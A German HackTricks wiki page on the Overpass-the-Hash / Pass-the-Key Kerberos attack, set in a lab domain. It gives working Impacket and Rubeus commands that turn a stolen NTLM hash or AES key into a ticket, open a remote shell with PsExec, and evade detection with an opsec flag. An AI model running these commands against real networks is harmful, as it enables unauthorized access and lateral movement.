# Überwinden Sie den Hash/Übergeben Sie den Schlüssel

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

## Überwinden Sie den Hash/Übergeben Sie den Schlüssel (PTK)

Der Angriff **Überwinden Sie den Hash/Übergeben Sie den Schlüssel (PTK)** ist für Umgebungen konzipiert, in denen das traditionelle NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder die AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern und unbefugten Zugriff auf Ressourcen innerhalb eines Netzwerks zu ermöglichen.

Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des angegriffenen Benutzerkontos zu erlangen. Nachdem diese Informationen gesichert wurden, kann ein Ticket Granting Ticket (TGT) für das Konto erhalten werden, was es dem Angreifer ermöglicht, auf Dienste oder Maschinen zuzugreifen, für die der Benutzer Berechtigungen hat.

Der Prozess kann mit den folgenden Befehlen eingeleitet werden:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES-Schlüssel]` verwendet werden. Darüber hinaus kann das erhaltene Ticket mit verschiedenen Tools wie smbexec.py oder wmiexec.py verwendet werden, um den Angriffsbereich zu erweitern.

Probleme wie _PyAsn1Error_ oder _KDC kann den Namen nicht finden_ werden in der Regel durch Aktualisierung der Impacket-Bibliothek oder Verwendung des Hostnamens anstelle der IP-Adresse gelöst, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.

Eine alternative Befehlssequenz mit Rubeus.exe zeigt eine weitere Facette dieser Technik:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode spiegelt den Ansatz von **Pass the Key** wider und konzentriert sich darauf, das Ticket direkt für Authentifizierungszwecke zu übernehmen und zu nutzen. Es ist wichtig zu beachten, dass die Initiierung einer TGT-Anforderung das Ereignis `4768: Ein Kerberos-Authentifizierungsticket (TGT) wurde angefordert` auslöst, was standardmäßig auf RC4-HMAC hinweist, obwohl moderne Windows-Systeme AES256 bevorzugen.

Um den operationellen Sicherheitsstandards zu entsprechen und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referenzen

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
